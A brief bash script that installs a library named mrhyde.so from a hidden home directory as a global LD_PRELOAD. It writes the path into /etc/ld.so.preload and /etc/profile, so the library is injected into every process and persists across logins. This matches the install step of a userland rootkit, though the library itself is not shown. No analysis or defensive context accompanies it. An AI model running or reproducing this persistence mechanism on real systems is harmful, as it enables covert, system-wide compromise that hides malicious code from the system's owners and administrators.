#!/bin/bash
sudo touch /etc/ld.so.preload
export LD_PRELOAD=/home/.grisun0/mrhyde.so
echo 'export LD_PRELOAD=/home/.grisun0/mrhyde.so' | sudo tee -a /etc/profile
echo '/home/.grisun0/mrhyde.so' | sudo tee /etc/ld.so.preload
sudo ldconfig